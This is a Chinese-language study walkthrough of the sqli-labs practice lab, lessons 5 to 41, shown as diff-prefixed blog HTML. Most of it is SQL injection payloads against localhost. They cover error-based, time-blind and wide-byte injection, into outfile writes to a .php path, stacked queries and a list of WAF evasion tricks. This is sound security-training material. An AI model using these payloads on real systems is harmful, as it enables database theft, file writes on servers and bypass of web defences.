class="line">http://127.0.0.1/sqllib/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --</span><br><span class="line"></span><br><span class="line">利用数据的重复性</span><br><span class="line">http://127.0.0.1/sqllib/Less-5/?id=1&#x27;union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x --+</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用 sleep()函数进行注入</span><br><span class="line">http://127.0.0.1/sqllib/Less-5/?id=1&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br><span class="line"></span><br><span class="line">当错误的时候会有 5 秒的时间延时。 利用 BENCHMARK()进行延时注入</span><br><span class="line">http://127.0.0.1/sqllib/Less-5/?id=1&#x27;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BEN CHMARK(50000000,ENCODE(&#x27;MSG&#x27;,&#x27;by 5 seconds&#x27;)),null)),2,3 FROM (select database() as cur rent) as tb1--</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h4><p>‘换”</p>
+<hr>
+<h4 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h4><p>load_file() 读取本地文件<br>    select load_file(‘C:\phpstudy\PHPTutorial\WWW]]sqli\Less-7\test.txt’);</p>
+<p>into outfile() 写入文件<br>    select ‘mysql is ver good’ into outfile ‘test1.txt’;<br>    select ‘crow 666’ into outfile ‘C:\phpstudy\PHPTutorial\WWW\sqli\Less-7\test.txt’;</p>
+<p>可以将文件路径进行base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqllib/Less-7/?id=1&#x27;)) or 1=1--+ </span><br><span class="line">http://127.0.0.1/sqllib/Less-7/?id=1&#x27;))UNION SELECT 1,2,3 into outfile &quot;c:\\wamp\\www\\sqlli b\\Less-7\\uuu.txt&quot;%23</span><br><span class="line">http://127.0.0.1/sqllib/Less-7/?id=1&#x27;))UNION SELECT 1,2,&#x27;&#x27; i nto outfile &quot;c:\\wamp\\www\\sqllib\\Less-7\\yijuhua.php&quot;--+ </span><br><span class="line"></span><br><span class="line">http://localhost/sqli-labs/Less-7/?id=1&#x27;)) union select 1,2,&#x27;texxxxxxxxxxxxxxxxxt&#x27; into outfile &quot;D:\\Software\\phpStudy\\WWW\\sqli-labs\\Less-7\\test1.php&quot; --+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">使用延迟的方法判断是否存在注入漏洞</span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&#x27; and sleep(5) --+</span><br><span class="line">当为8时加载很快，而为其他值时加载较慢（5s左右），说明此时数据库的长度就是8（security）</span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&#x27; and if(length(database())=8,1,sleep(5)) --+</span><br><span class="line">如果当前数据库的第一个字母的ascii值大于113时，会立刻返回结果，否则执行5s</span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&#x27; and if(ascii(substr(select database(),1,1))&gt;113,1,sleep(5)) --+</span><br><span class="line">--+和# 注释有偏差，一般pose使用#号</span><br><span class="line">select if(ascii(substr((select database()),1,1))&gt;10,2,3)</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqllib/Less-8/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ </span><br><span class="line">http://127.0.0.1/sqllib/Less-8/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less9"><a href="#Less9" class="headerlink" title="Less9"></a>Less9</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 猜测数据库</span><br><span class="line">说明第一位是 s （ascii 码是 115）</span><br><span class="line">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ </span><br><span class="line">说明第一位是 e</span><br><span class="line">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+ </span><br><span class="line">以此类推，我们知道了数据库名字是 security</span><br><span class="line"></span><br><span class="line"># 猜测security的数据表</span><br><span class="line">猜测第一个数据表的第一位是 e,...依次类推，得到 emails</span><br><span class="line">http://127.0.0.1/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select table_name from information_s chema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,1,sleep(5))--+ </span><br><span class="line">猜测第二个数据表的第一位是 r,...依次类推，得到 referers</span><br><span class="line">http://127.0.0.1/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select table_name from information_s chema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1))=114,1,sleep(5))--+  </span><br><span class="line">... 再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users</span><br><span class="line"></span><br><span class="line"># 猜测user表的列</span><br><span class="line">猜测 users 表的第一个列的第一个字符是 i， 以此类推，我们得到列名是 id，username，password</span><br><span class="line">http://127.0.0.1/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select column_name from information _schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=105,1,sleep(5))--+ </span><br><span class="line"></span><br><span class="line"># 猜测username的值</span><br><span class="line">猜测 username 的第一行的第一位 以此类推，我们得到数据库 username，password 的所有内容</span><br><span class="line">http://127.0.0.1/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))--+ </span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h4 id="Less10"><a href="#Less10" class="headerlink" title="Less10"></a>Less10</h4><p>‘换“</p>
+<hr>
+<p>常用符<br>‘<br>‘)<br>‘))<br>“<br>“)<br>“))</p>
+<hr>
+<h4 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h4><p>admin’#<br>admin’or’1’&#x3D;’1#<br>1admin’ union select 1, database() #</p>
+<hr>
+<h4 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h4><p>admin”)</p>
+<hr>
+<h4 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h4><p>admin’)</p>
+<p>盲注</p>
+<p>admin’)and left(database(),1)&gt;’a’#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<hr>
+<h4 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h4><p>admin”</p>
+<p>admin”and left(database(),1)&gt;’a’#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<p>admin”and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd&#x3D;1&amp;submi t&#x3D;Submit</p>
+<hr>
+<h4 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h4><p>admin’and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</p>
+<p>正确的时候可以直接登录，不正确的时候延时 5 秒。</p>
+<hr>
+<h4 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h4><p>admin”)</p>
+<p>admin”)and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit </p>
+<hr>
+<p>updatexml(XML_document, XPath_string, new_value);<br>XML_document：是string格式，为XML文档对象的名称，文中为Doc<br>XPath_string：Xpath格式的字符串<br>new_value：String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值</p>
+<p>select updatexml(1, concat(0x7e, (select username from security.users limit 0,1), 0x7e), 1);<br>其中concat函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出 <del>Dumb</del></p>
+<p>admin’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),0x7e),1) #</p>
+<hr>
+<h4 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h4><p>报错盲注<br>uname&#x3D;admin&amp;passwd&#x3D;11’and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;sub mit&#x3D;Submit<br>将@@version 换成你的子句就可以进行其他的注入了。</p>
+<p>延时盲注<br>uname&#x3D;admin&amp;passwd&#x3D;11’and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;submit&#x3D;Submit</p>
+<hr>
+<h4 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h4><p>将 user-agent 修改为’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’&#x3D;’1<br>‘ or updatexml(1,concat(0x7e,(database())),1) and ‘1’&#x3D;’1</p>
+<hr>
+<h4 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h4><p>将 referer 修改为’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’&#x3D;’1</p>
+<hr>
+<h4 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h4><p>修改 cookie 为 uname&#x3D;admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#<br>修改cookie可使用chrome插件 Cookie Editor</p>
+<hr>
+<h4 id="Less21"><a href="#Less21" class="headerlink" title="Less21"></a>Less21</h4><p>本关对 cookie 进行了 base64 的处理，其他的处理流程和 less20一样</p>
+<p>我们这里可以利用 less20 同样的方法，但是需要将 payload 进行 base64 编码处理（注意这里对 uname 进行了 (‘uname’)的处理。</p>
+<p>Cookie： uname&#x3D;YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM&#x3D;</p>
+<hr>
+<h4 id="Less22"><a href="#Less22" class="headerlink" title="Less22"></a>Less22</h4><p>本关和 less20、less21 是一致的，我们可以从源代码中看到这里对 uname 进行了”uname”的处理，可以构造 payload：<br>admin1”and extractvalue(1,concat(0x7e,(select database()),0x7e))#<br>Payload 进行 base64 编码后，修改 cookie 再进行提交</p>
+<hr>
+<h4 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h4><p>源码中对各种符号进行了过滤，所以这里只能使用and 或者 or来进行闭合。</p>
+<p>但这里可以用一种特殊的注释符 ;%00<br>可以通过这个注释符判断列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看回显位置</span><br><span class="line">http://localhost/sqli-labs/Less-23/?id=-1&#x27; union select 1,2,3 ;%00</span><br><span class="line">http://localhost/sqli-labs/Less-23/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata ;%00</span><br><span class="line"></span><br><span class="line">报错注入</span><br><span class="line">http://localhost/sqli-labs/Less-23/?id=1&#x27; and updatexml(1, concat(0x7e,(database())),1) or &#x27;1&#x27;=&#x27;1</span><br><span class="line">http://localhost/sqli-labs/Less-23/?id=1&#x27; and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),1) or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">http://localhost/sqli-labs/Less-23/?id=-1&#x27; union select 1,@@datadir,&#x27;3#</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less24"><a href="#Less24" class="headerlink" title="Less24"></a>Less24</h4><p>二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取后进入到SQL查询语句所导致的注入。扶着可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
+<p>二次注入可以概括为以下两步：</p>
+<ol>
+<li>插入恶意数据：进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
+<li>引用恶意数据：开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>
+</ol>
+<p>例：输入参数 id&#x3D;1’  —— 传输转义 id&#x3D;1&#39; —— 此时转义之后无法注入 —— 存入数据库为1’ —— 再次取出直接闭合</p>
+<p><img src="/images/20230519124731.png" class="lazy" data-srcset="/images/20230519124731.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAABlBMVEXMzMyWlpYU2uzLAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAACklEQVQImWNgAAAAAgAB9HFkpgAAAABJRU5ErkJggg=="></p>
+<ol>
+<li>本关中由于对数据库长度做了限制，所以本次只演示替换密码</li>
+<li>实现我们先查询当前的user表，找到admin的密码</li>
+<li>我们使用admin’#注册一个账号，再登录</li>
+<li>修改admin的密码</li>
+</ol>
+<hr>
+<h4 id="Less25"><a href="#Less25" class="headerlink" title="Less25"></a>Less25</h4><ol>
+<li>白盒绕过<br> 通过源代码分析，来进行绕过</li>
+<li>黑盒绕过<ol>
+<li>架构层面绕过WAF<ol>
+<li>寻找源网站绕过WAF检测：主要针对的是云WAF，找到源网站的真实地址，进行绕过，有点像CDN</li>
+<li>通过同网段绕过WAF防护：在一个网段中，可能经过的数据不会经过云WAF，从而实现绕过。</li>
+</ol>
+</li>
+<li>资源限制角度绕过WAF<br> 一般WAF的执行需要优先考虑业务优先的原则，所以对于构造较大、超大数据包可能不会进行检测，从而实现绕过WAF。</li>
+<li>协议层面绕过WAF<ol>
+<li>协议未覆盖绕过WAF：比如由于业务需要，只对GET型进行检测，POST数据选择忽略。</li>
+<li>参数污染：index?id&#x3D;1&amp;id&#x3D;2 WAF可能只对id&#x3D;1进行检测</li>
+</ol>
+</li>
+<li>规则层面绕过WAF<ol>
+<li>SQL注释符绕过<ol>
+<li>union &#x2F;**&#x2F; select 我们将union select之间的空格使用注释符进行替换 （适用于对union select之间的空格进行检测的情况）</li>
+<li>union&#x2F;<em>crow%0%32</em>&#x2F;select 我们在注释符中间填充内容</li>
+<li>union&#x2F;<em>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbb</em>&#x2F;select  构造较大数据</li>
+<li>&#x2F;<em>!union select</em>&#x2F; 内敛注释 MYSQL特有</li>
+</ol>
+</li>
+<li>空白符绕过<ol>
+<li>MYSQL空白符：%09；%0A；%0B；%0D；%20；%0C；%A0；&#x2F;<em>XXX</em>&#x2F;</li>
+<li>正则空白符：%09；%0A；%0B；%0D；%20；<br> %25是百分号，%25A0是空白符</li>
+</ol>
+</li>
+<li>函数分割符号<br> 将一个函数进行分割concat()<br> concat%2520()<br> concat&#x2F;**&#x2F;()<br> concat%250c()<br> concat%25a0()</li>
+<li>浮点数词法解释<br> WAF对于id&#x3D;1可以进行检测，但是对于id&#x3D;1E0、id&#x3D;1.0、id&#x3D;\N可能就无法检测</li>
+<li>利用error-based进行SQL注入<br> extractvalue(1, concat(0x5c,md5(3)));<br> updatexml(1, concat(0x5d,md5(3)),1);<br> GeometryCollection(select<em>from(select</em>from(select@@version)f)x)<br> polygon((select*from(select name const(version(),1))x))<br> linestring()<br> multipoint()<br> multilinestring()<br> multipolygon()</li>
+<li>MYSQL特殊语法<br> select {x schema_name} from {x information_schema.schemata};<br> select {x 1};</li>
+<li>大小写绕过<br> 如果对关键字and or union等进行了过滤，可以考虑使用大小写混合的方法<br> Or  aNd  UniOn<br> 但是很多时候有函数会部分大小写进行过滤，这个时候我们可以考虑使用双写的方法</li>
+<li>关键字重复<br> OORr</li>
+<li>关键字替换<br> 如果还是无法绕过，可以考虑替换的方法<br> and —— &amp;&amp;<br> or —— ||<br> like —— &#x3D;<br> &lt;&gt; —— !&#x3D;<br> 方法有很多，这里依然列举可能不足</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>fuzz测试<br> 可以使用burpsuite配合手工进行测试，后期测试成功后再用脚本进行处理。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">or被过滤，尝试双写</span><br><span class="line">http://localhost/sqli-labs/Less-25/?id=1&#x27; oorrder by 1--+</span><br><span class="line">获得回显</span><br><span class="line">http://localhost/sqli-labs/Less-25/?id=-1&#x27; union select 1,2,3--+</span><br><span class="line">所有or都需要写两次</span><br><span class="line">http://localhost/sqli-labs/Less-25/?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from security.users--+</span><br><span class="line">使用基于时间的布尔盲注</span><br><span class="line">http://localhost/sqli-labs/Less-25/?id=-1 oorr if(length(database())&gt;1,1,sleep(5))--+</span><br><span class="line">布尔盲注 返回正常，可知大于1</span><br><span class="line">http://localhost/sqli-labs/Less-25/?id=-1 oorr length(database())&gt;1--+</span><br><span class="line"></span><br><span class="line">Less25a</span><br><span class="line">http://localhost/sqli-labs/Less-25a/?id=-1 union select 1,2,3 --</span><br><span class="line">http://localhost/sqli-labs/Less-25a/?id=-1 oorr if(length(database())&gt;1,1,sleep(5))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less26"><a href="#Less26" class="headerlink" title="Less26"></a>Less26</h4><p>%09  TAB键（水平）<br>%0a  新建一行<br>%0c  新的一页<br>%0d  return 功能<br>%0b  TAB键（垂直）<br>%a0  空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows下无法使用特殊字符代替空格，因为apache的解析问题，换linux就没问题</span><br><span class="line">http://localhost/sqli-labs/Less-26/?id=1&#x27;%a0||&#x27;1</span><br><span class="line"></span><br><span class="line">Less26a</span><br><span class="line">http://localhost/sqli-labs/Less-26a/?id=100&#x27;) union%a0select%a01,2,3||(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less27"><a href="#Less27" class="headerlink" title="Less27"></a>Less27</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">字符过滤和大小写</span><br><span class="line">http://localhost/sqli-labs/Less-27/?id=100&#x27; union%a0SeLEcT%a01,database(),3||&#x27;1</span><br><span class="line"></span><br><span class="line">Less27a</span><br><span class="line">http://localhost/sqli-labs/Less-27a/?id=100 &quot;%a0Union%a0SElecT%a01,user(),&quot;3</span><br><span class="line">我们利用3前面的&quot;将后面的&quot;闭合掉。也可以用之前的方法 1,user(),3|| &quot;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less28"><a href="#Less28" class="headerlink" title="Less28"></a>Less28</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Less28</span><br><span class="line">http://localhost/sqli-labs/Less-28/?id=100&#x27;)union%a0select(1),(user()),(3)||(&#x27;1</span><br><span class="line">Less28a</span><br><span class="line">http://localhost/sqli-labs/Less-28a/?id=100%27)union%0bsElect%0b1,@@basedir,3||(%271</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less29"><a href="#Less29" class="headerlink" title="Less29"></a>Less29</h4><p>服务器两层架构<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762961.html">Background-6 服务器（两层）架构</a><br>http参数污染：jsp&#x2F;tomcat使 用getgetParameter(“id”)获取到的是第一个值，php&#x2F;apache使用$_ GET[“id”]<br>获取的是第二个值，那么第一个id纯数字，第二个id的值注入就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">说明数据有3列，且第一个id值无法注入</span><br><span class="line">http://localhost/sqli-labs/Less-29/?id=1&amp;id=3&#x27; order by 3--+</span><br><span class="line">掌握回显位置</span><br><span class="line">http://localhost/sqli-labs/Less-29/?id=1&amp;id=113&#x27; union select 1,2,3--+</span><br><span class="line">获取数据库</span><br><span class="line">http://localhost/sqli-labs/Less-29/?id=1&amp;id=113&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less30"><a href="#Less30" class="headerlink" title="Less30"></a>Less30</h4><p>‘换“</p>
+<hr>
+<h4 id="Less31"><a href="#Less31" class="headerlink" title="Less31"></a>Less31</h4><p>换”)</p>
+<hr>
+<h4 id="Less32"><a href="#Less32" class="headerlink" title="Less32"></a>Less32</h4><p><strong>宽字节注入</strong><br>宽字节: GB2312、 GBK、 GB18030、 BIG5、 Shift. JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是ASCI字符(一字节)的现象，即将两个asci字符误认为是一个宽字节字符。中文、韩文、日文等均存在宽字节，英文默认都是一个字节。<br>在使用PHP连接MySQL的时候，当设置“set character. set. client &#x3D; gbk”时会导致个编码转换的问题。<br>例子：id&#x3D; 1’  处理1&#39;  进行编码1%5c%27  带入sql后id&#x3D;&#39;and XXX 此时无法完成注入<br>id&#x3D;1%df’ 处理 1%df&#39; 进行编码1%df%5c%27 带入sql后id &#x3D;1運’ and XXX 此时存在宽字节注入漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注入</span><br><span class="line">http://localhost/sqli-labs/Less-32/?id=-1%df&#x27; union select 1,2,3--+</span><br><span class="line">将单引号内的内容用16进制替代</span><br><span class="line">http://localhost/sqli-labs/Less-32/?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二</strong><br>%5c代表的是<br>此时构造：%5c %5c %5c %5c’<br>只要是我们能将返回的结果中对于单引号没有转义字符进行处理即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">示例</span><br><span class="line">http://localhost/sqli-labs/Less-32/?id=-1%aa%5c&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less33"><a href="#Less33" class="headerlink" title="Less33"></a>Less33</h4><p>php中的addslashes()函数<br>自定义过滤，该函数在预定义字符之前添加反斜杠的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一 直接使用宽字节方法</span><br><span class="line">http://localhost/sqli-labs/Less-33/?id=-1%df&#x27; union select 1,2,3--+</span><br><span class="line">方法二 自定义闭合</span><br><span class="line">http://localhost/sqli-labs/Less-33/?id=-1%aa%5c%27 union select 1,2,3--+	</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less34"><a href="#Less34" class="headerlink" title="Less34"></a>Less34</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入: </span><br><span class="line">echo Ssql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>我们首先测试在POST情况下，传入正确和错误的值回显情祝：</p>
+<ol>
+<li>admin:admin 正确的密码和账号&gt;返回姓名等常规信息</li>
+<li>ad:ad；错误的密码和账号&gt;返回的是登录失败</li>
+<li>同样通过代码可知，本关也使用了addslases()函数，理论上我们可以使用前几关中的宽字节注入的方法进行测试，但是测试的时候发现，方法并不奏效。(主 要原因是因为我们不能够直接在POST中传入数据，因为会被再次编码)</li>
+</ol>
+<p>分析，在get型传 参的时候使用URLencode，所以我们可以使用以下两种方法：<br>法一：我们借鉴了将单引号的UTF 8转换为UTF 16的单引号模式‘→目’<br>法二：我们使用burpsuite进行抓包之后对数据进行宽字节注入</p>
+<p><img src="/images/20230605164552.png" class="lazy" data-srcset="/images/20230605164552.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAABlBMVEXMzMyWlpYU2uzLAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAACklEQVQImWNgAAAAAgAB9HFkpgAAAABJRU5ErkJggg=="></p>
+<hr>
+<h4 id="Less35"><a href="#Less35" class="headerlink" title="Less35"></a>Less35</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注入</span><br><span class="line">http://localhost/sqli-labs/Less-35/?id=1 and if(    length(database())=1,1,sleep(5)     )--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less36"><a href="#Less36" class="headerlink" title="Less36"></a>Less36</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注入 但不可用，不知为何</span><br><span class="line">http://localhost/sqli-labs/Less-36/?id=-1%df&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less37"><a href="#Less37" class="headerlink" title="Less37"></a>Less37</h4><p>我们首先测试在POST情况下，传入正确和错误的值回显情况：</p>
+<ol>
+<li>admin:admin  正确的密码和账号-&gt;返回姓名等常规信息</li>
+<li>ad:ad  错误的密码和账号-&gt;返回的是登录失败</li>
+<li>与34关基本相似，本关只是将过滤函数进行了替换: mysgL real escape string()， 同样，我们可以直接按照34关的方法即可！</li>
+</ol>
+<p>分析，在get型传参的时候使用URLencode，所以我们可以使用以下两种方法：<br>法一：我们借鉴了将单引号的UTF -8转换为UTF-16的单引号模式’→白’<br>法二：我们使用burpsuite进行 抓包之后对数据进行宽字节注入</p>
+<p><img src="/images/20230605171806.png" class="lazy" data-srcset="/images/20230605171806.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAABlBMVEXMzMyWlpYU2uzLAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAACklEQVQImWNgAAAAAgAB9HFkpgAAAABJRU5ErkJggg=="></p>
+<hr>
+<h4 id="Less38"><a href="#Less38" class="headerlink" title="Less38"></a>Less38</h4><p>堆叠注入<br>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句(多条) -起执行。 而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。 这个叫 做stacked injection.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">堆叠注入 插入表</span><br><span class="line">http://localhost/sqli-labs/Less-38/?id=1&#x27;; create table crow2 like users; --+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less39"><a href="#Less39" class="headerlink" title="Less39"></a>Less39</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">无需包裹，直接注入</span><br><span class="line">http://localhost/sqli-labs/Less-39/?id=1; create table crow2 like users; --+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less40"><a href="#Less40" class="headerlink" title="Less40"></a>Less40</h4><p>’)</p>
+<hr>
+<h4 id="Less41"><a href="#Less41" class="headerlink" title="Less41"></a>Less41</h4><p>和Less39一样，无需包裹，但报错不会显示出来。</p>
+<hr>
